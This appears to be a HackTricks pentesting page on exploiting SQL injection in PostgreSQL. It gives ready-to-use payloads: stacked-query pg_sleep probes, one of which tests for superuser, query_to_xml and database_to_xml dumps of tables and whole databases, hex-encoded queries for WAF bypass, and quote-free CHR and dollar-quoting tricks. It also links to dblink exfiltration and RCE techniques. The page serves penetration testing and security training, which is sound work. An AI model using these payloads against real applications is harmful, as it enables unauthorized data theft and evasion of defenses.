# PostgreSQL injection

{{#include ../../../banners/hacktricks-training.md}}


---

**This page explains techniques that can help exploit SQL injection in PostgreSQL and complements the examples in** [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md).<sup>[[1]](#references)</sup>

## Network Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure & Exfiltration

The PostgreSQL `dblink` module can connect to other PostgreSQL instances and open outbound TCP connections. These features, combined with `COPY FROM`, can enable privilege escalation, port scanning, NTLM challenge-response capture, and exfiltration. See the [detailed attack techniques](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md).

### **Exfiltration example using dblink and large objects**

You can [**read this example**](dblink-lo_import-data-exfiltration.md) to see a CTF example of **how to load data inside large objects and then exfiltrate the content of large objects inside the username** of the function `dblink_connect`.

## PostgreSQL Attacks: Read/Write, RCE, and Privilege Escalation

Check how to compromise the host and escalate privileges from PostgreSQL in:


{{#ref}}
../../../network-services-pentesting/pentesting-postgresql.md
{{#endref}}

## WAF bypass

### PostgreSQL String functions

Manipulating strings could help you to **bypass WAFs or other restrictions**.\
The PostgreSQL string-functions reference provides useful building blocks for payload construction.<sup>[[4]](#references)</sup>

### Stacked Queries

PostgreSQL supports multiple statements in a simple-query message, but whether a SQL-injection sink accepts stacked queries depends on its client library and execution API. Even when a second result cannot be returned cleanly, a time-based side effect such as `pg_sleep` may still be observable.<sup>[[2]](#references)</sup>

```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```

### XML tricks

**query_to_xml**

This function returns a query result as one XML value, which can collapse many rows into one response. Large results can consume substantial server and client memory.<sup>[[3]](#references)</sup>

```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```

**database_to_xml**

This function will dump the whole database in XML format in just 1 row (be careful if the database is very big as you may DoS it or even your own client):

```sql
SELECT database_to_xml(true,true,'');
```

### Strings in Hex

If you can run **queries** passing them **inside a string** (for example using the **`query_to_xml`** function). **You can use the convert_from to pass the string as hex and bypass filters this way:**

```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```

### Forbidden quotes

If cannot use quotes for your payload you could bypass this with `CHR` for basic clauses (_character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements_):

```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```

Or with `$`. This queries return the same results:

```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```

## References

- [1] [PayloadsAllTheThings – PostgreSQL Injection cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
- [2] [PostgreSQL documentation — Simple Query protocol](https://www.postgresql.org/docs/current/protocol-flow.html#PROTOCOL-FLOW-MULTI-STATEMENT)
- [3] [PostgreSQL documentation — XML functions](https://www.postgresql.org/docs/current/functions-xml.html)
- [4] [PostgreSQL Tutorial — String functions](https://www.postgresqltutorial.com/postgresql-string-functions/)

{{#include ../../../banners/hacktricks-training.md}}
